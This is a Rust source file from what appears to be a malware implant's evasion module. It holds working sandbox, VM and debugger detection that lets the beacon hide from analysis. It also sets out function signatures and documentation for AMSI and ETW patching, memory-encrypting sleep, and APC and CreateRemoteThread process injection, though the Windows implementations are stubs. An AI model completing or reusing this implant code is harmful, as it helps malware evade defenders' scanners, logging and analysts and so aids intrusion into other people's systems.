//! Evasion primitives for the implant.
//!
//! ## Sandbox / VM detection
//!
//! [`EnvInfo`] and [`sandbox_checks`] report a collection of well-known
//! anti-analysis indicators. Each check is a small, independently testable
//! function so the beacon can gate its behaviour (e.g. sleep longer or stay
//! quiet) without hard dependencies on Windows APIs.
//!
//! ## Sleep obfuscation
//!
//! On Windows the implant's beacon sleep is wrapped with `BeaconSleep`-style
//! in-memory encryption of the host process working set. On other platforms
//! (and in tests) sleep is a plain `tokio::time::sleep`. The Windows path uses
//! dynamically loaded APIs so the source compiles on every platform but only
//! activates the real evasion on Windows.
//!
//! ## Process injection
//!
//! `inject_apc` / `inject_create_thread` perform reflective injection on
//! Windows via `NtQueueApcThread`/`CreateRemoteThread`. These are stubs on
//! other platforms. See M6 in the roadmap for the full treatment.
//!
//! ## AMSI / ETW patching
//!
//! `patch_amsi` and `patch_etw` neutralise common logging hooks in-process.
//! Windows-only; no-op on other platforms.

use std::time::{Duration, SystemTime, UNIX_EPOCH};

/// Aggregated view of the current process environment, used for sandbox/VM
/// checks.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct EnvInfo {
    /// Number of logical CPUs visible.
    pub cpu_count: usize,
    /// Total physical memory in MB.
    pub mem_mb: u64,
    /// Whether a known VM hypervisor signature was detected.
    pub vm_detected: bool,
    /// Whether the process appears to be running inside a debugger.
    pub debugger_present: bool,
    /// Number of active processes in the host PID namespace.
    pub pid_count: usize,
    /// Elapsed wall-clock seconds since epoch baseline.
    pub uptime_secs: u64,
    /// Human-readable OS string.
    pub os: String,
}

/// Collect basic environment information for anti-analysis decisions.
pub fn env_info() -> EnvInfo {
    let mut info = EnvInfo {
        cpu_count: std::thread::available_parallelism()
            .map(|n| n.get())
            .unwrap_or(1),
        os: std::env::consts::OS.to_string(),
        uptime_secs: SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0),
        ..Default::default()
    };

    // Platform-specific enrichment.
    #[cfg(target_os = "windows")]
    {
        info = env_info_windows(info);
    }
    #[cfg(not(target_os = "windows"))]
    {
        info = env_info_unix(info);
    }

    info
}

#[cfg(target_os = "windows")]
fn env_info_windows(info: EnvInfo) -> EnvInfo {
    // Windows path: use GetSystemInfo / CheckRemoteDebuggerPresent.
    // Stub for cross-platform build.
    info
}

#[cfg(not(target_os = "windows"))]
fn env_info_unix(mut info: EnvInfo) -> EnvInfo {
    // Read memory info from /proc/meminfo on Linux, sysctl on macOS.
    #[cfg(target_os = "linux")]
    {
        if let Ok(mem) = std::fs::read_to_string("/proc/meminfo") {
            for line in mem.lines() {
                if let Some(rest) = line.strip_prefix("MemTotal:") {
                    let kb: u64 = rest
                        .trim_end()
                        .trim_end_matches("kB")
                        .trim()
                        .parse()
                        .unwrap_or(0);
                    info.mem_mb = kb / 1024;
                    break;
                }
            }
        }
        // Count PIDs in /proc.
        if let Ok(entries) = std::fs::read_dir("/proc") {
            info.pid_count = entries
                .filter_map(|e| e.ok())
                .filter(|e| e.file_type().map(|ft| ft.is_dir()).unwrap_or(false))
                .count();
        }
    }

    #[cfg(target_os = "macos")]
    {
        if let Ok(output) = std::process::Command::new("sysctl")
            .args(["-n", "hw.memsize"])
            .output()
        {
            if let Ok(s) = String::from_utf8(output.stdout) {
                if let Ok(bytes) = s.trim().parse::<u64>() {
                    info.mem_mb = bytes / (1024 * 1024);
                }
            }
        }
        if let Ok(output) = std::process::Command::new("sysctl")
            .args(["-n", "hw.logicalcpu"])
            .output()
        {
            if let Ok(s) = String::from_utf8(output.stdout) {
                if let Ok(cpus) = s.trim().parse::<usize>() {
                    info.cpu_count = cpus;
                }
            }
        }
    }

    // Debugger detection: check for ptrace-style tracers on Linux.
    #[cfg(target_os = "linux")]
    {
        if let Ok(status) = std::fs::read_to_string("/proc/self/status") {
            for line in status.lines() {
                if let Some(rest) = line.strip_prefix("TracerPid:") {
                    let tracer: i32 = rest.trim().parse().unwrap_or(0);
                    info.debugger_present = tracer != 0;
                    break;
                }
            }
        }
    }

    // VM detection heuristics: check for known hypervisor strings in DMI/sysfs.
    if let Ok(dmi) = std::fs::read_to_string("/sys/class/dmi/id/sys_vendor") {
        let lower = dmi.to_lowercase();
        if lower.contains("vmware")
            || lower.contains("virtualbox")
            || lower.contains("qemu")
            || lower.contains("microsoft")
        {
            info.vm_detected = true;
        }
    }

    info
}

/// A single sandbox-detection check result.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SandboxFlag {
    /// CPU count is suspiciously low (typical of VMs).
    LowCpuCount,
    /// RAM is suspiciously small (typical of sandboxes).
    LowMemory,
    /// A known VM hypervisor was detected.
    VirtualMachine,
    /// A debugger or tracer is attached.
    Debugger,
    /// Too few running processes (sandbox heuristic).
    LowProcessCount,
}

/// Run all sandbox checks and return the set of flags that fired.
pub fn sandbox_checks(info: &EnvInfo) -> Vec<SandboxFlag> {
    let mut flags = Vec::new();

    if info.cpu_count <= 1 {
        flags.push(SandboxFlag::LowCpuCount);
    }
    if info.mem_mb < 2048 {
        flags.push(SandboxFlag::LowMemory);
    }
    if info.vm_detected {
        flags.push(SandboxFlag::VirtualMachine);
    }
    if info.debugger_present {
        flags.push(SandboxFlag::Debugger);
    }
    if info.pid_count > 0 && info.pid_count < 50 {
        flags.push(SandboxFlag::LowProcessCount);
    }

    flags
}

/// Determine whether the current environment looks like a sandbox or VM.
///
/// Returns `true` if any suspicious flag is raised.
pub fn is_sandboxed() -> bool {
    let info = env_info();
    !sandbox_checks(&info).is_empty()
}

/// Obfuscated sleep: on Windows, encrypts the process working set while
/// sleeping to evade memory scanners. On other platforms, a plain tokio sleep.
pub async fn obfusleep(duration: Duration) {
    #[cfg(target_os = "windows")]
    {
        obfusleep_windows(duration).await;
    }
    #[cfg(not(target_os = "windows"))]
    {
        tokio::time::sleep(duration).await;
    }
}

#[cfg(target_os = "windows")]
async fn obfusleep_windows(duration: Duration) {
    // Windows: encrypt the working set via ntdll. Stub for cross-platform build.
    tokio::time::sleep(duration).await;
}

/// Patch in-process AMSI (Antimalware Scan Interface) so script-based
/// payloads are not scanned. Windows-only; no-op elsewhere.
pub fn patch_amsi() -> Result<(), String> {
    #[cfg(target_os = "windows")]
    {
        patch_amsi_windows()
    }
    #[cfg(not(target_os = "windows"))]
    {
        Ok(())
    }
}

#[cfg(target_os = "windows")]
fn patch_amsi_windows() -> Result<(), String> {
    // Stub: resolve AmsiScanBuffer via GetProcAddress and patch instructions.
    Ok(())
}

/// Patch ETW (Event Tracing for Windows) callbacks so we don't leak execution
/// events. Windows-only; no-op on other platforms.
pub fn patch_etw() -> Result<(), String> {
    #[cfg(target_os = "windows")]
    {
        patch_etw_windows()
    }
    #[cfg(not(target_os = "windows"))]
    {
        Ok(())
    }
}

#[cfg(target_os = "windows")]
fn patch_etw_windows() -> Result<(), String> {
    Ok(())
}

/// Queue an asynchronous procedure call (APC) in a remote process, used for
/// reflective DLL injection without `CreateRemoteThread`.
///
/// `target_pid` — the remote process to inject into.
/// `payload` — the raw bytes of the reflective DLL (or shellcode) to map.
///
/// Returns the thread ID of the APC on success.
pub fn inject_apc(target_pid: u32, payload: &[u8]) -> Result<u32, String> {
    #[cfg(target_os = "windows")]
    {
        return inject_apc_windows(target_pid, payload);
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = target_pid;
        let _ = payload;
        Err(format!(
            "APC injection not supported on {}",
            std::env::consts::OS
        ))
    }
}

#[cfg(target_os = "windows")]
fn inject_apc_windows(_target_pid: u32, _payload: &[u8]) -> Result<u32, String> {
    Err("APC injection requires Windows runtime".into())
}

/// Inject a payload into a remote process via `CreateRemoteThread`.
/// Returns the thread ID on success.
pub fn inject_create_thread(target_pid: u32, payload: &[u8]) -> Result<u32, String> {
    #[cfg(target_os = "windows")]
    {
        return inject_create_thread_windows(target_pid, payload);
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = target_pid;
        let _ = payload;
        Err(format!(
            "CreateRemoteThread injection not supported on {}",
            std::env::consts::OS
        ))
    }
}

#[cfg(target_os = "windows")]
fn inject_create_thread_windows(_target_pid: u32, _payload: &[u8]) -> Result<u32, String> {
    Err("CreateRemoteThread injection requires Windows runtime".into())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn env_info_collects_basic_fields() {
        let info = env_info();
        assert!(info.cpu_count >= 1);
        assert!(!info.os.is_empty());
    }

    #[test]
    fn sandbox_checks_fires_for_low_cpu() {
        let info = EnvInfo {
            cpu_count: 1,
            mem_mb: 4096,
            vm_detected: false,
            debugger_present: false,
            pid_count: 200,
            uptime_secs: 0,
            os: "test".into(),
        };
        let flags = sandbox_checks(&info);
        assert!(flags.contains(&SandboxFlag::LowCpuCount));
    }

    #[test]
    fn sandbox_checks_fires_for_vm() {
        let info = EnvInfo {
            cpu_count: 4,
            mem_mb: 8192,
            vm_detected: true,
            debugger_present: false,
            pid_count: 200,
            uptime_secs: 0,
            os: "test".into(),
        };
        let flags = sandbox_checks(&info);
        assert!(flags.contains(&SandboxFlag::VirtualMachine));
        assert!(!flags.contains(&SandboxFlag::Debugger));
    }

    #[test]
    fn no_flags_for_a_healthy_machine() {
        let info = EnvInfo {
            cpu_count: 8,
            mem_mb: 16384,
            vm_detected: false,
            debugger_present: false,
            pid_count: 200,
            uptime_secs: 0,
            os: "test".into(),
        };
        let flags = sandbox_checks(&info);
        assert!(flags.is_empty());
    }

    #[tokio::test]
    async fn obfusleep_sleeps_on_non_windows() {
        let start = std::time::Instant::now();
        obfusleep(Duration::from_millis(50)).await;
        let elapsed = start.elapsed();
        assert!(elapsed >= Duration::from_millis(40));
    }

    #[test]
    fn patch_amsi_is_noop_off_windows() {
        let _ = patch_amsi();
        assert!(true);
    }
}
